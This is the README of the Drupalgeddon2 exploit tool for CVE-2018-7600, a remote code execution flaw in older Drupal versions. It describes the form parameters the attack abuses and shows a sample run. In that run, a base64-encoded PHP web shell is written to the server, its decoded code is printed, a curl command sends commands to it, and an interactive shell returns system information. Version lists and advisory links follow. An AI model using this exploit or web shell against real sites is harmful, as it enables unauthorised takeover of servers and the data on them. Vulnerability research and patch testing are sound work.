# CVE-2018-7600 | Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' RCE (SA-CORE-2018-002)

[Drupalggedon2 - https://github.com/dreadlocked/Drupalgeddon2/](https://github.com/dreadlocked/Drupalgeddon2/) _([https://www.drupal.org/sa-core-2018-002](https://www.drupal.org/sa-core-2018-002))_

- [Hans Topo](https://github.com/dreadlocked)
- [g0tmi1k](https://blog.g0tmi1k.com/)

Supports:
- < 7.58 ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function.
- < 8.3.9 / < 8.4.6 / < 8.5.1 ~ `user/register` URL, attacking `account/mail` AJAX & `#post_render` parameter, using PHP's `exec` function.

This method was chosen, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ {[More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708)}.

- - -

#### Usage:

```bash
$ ruby drupalgeddon2.rb http://localhost/drupal/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://localhost/drupal/
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbImMiXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsiYyJdIC4gIiAyPiYxIiApOyB9 | base64 -d | tee s.php
--------------------------------------------------------------------------------
[!] MISSING: http://localhost/drupal/CHANGELOG.txt (404)
[+] Found  : http://localhost/drupal/core/CHANGELOG.txt (200)
[+] Drupal!: 8.4.5
--------------------------------------------------------------------------------
[*] PHP cmd: exec
--------------------------------------------------------------------------------
[+] Target seems to be exploitable! w00hooOO!
[+] Result: <?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }<span class="ajax-new-content"></span>
--------------------------------------------------------------------------------
[*]   curl 'http://localhost/drupal/s.php' -d 'c=whoami'
--------------------------------------------------------------------------------
[*] Fake shell:
drupalgeddon2> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
drupalgeddon2>
drupalgeddon2> uname -a
Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
drupalgeddon2>
```

For proxy support, edit the file, replacing with your values. Example:

```ruby
proxy_addr = '192.168.0.130'
proxy_port = 8080
```

- - -

#### Drupal Information:

Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002

Vulnerable Versions:

* < 7.58        **(Tested)**
* 8.x < 8.3.9
* 8.4.x < 8.4.6 **(Tested)**
* 8.5.x < 8.5.1 **(Tested)**

- - -

#### Links:

- **Write up & Research** ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
- Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
- Original Python PoC ~ https://github.com/a2u/CVE-2018-7600
- cURL commands ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
- CVE ~ https://nvd.nist.gov/vuln/detail/CVE-2018-7600
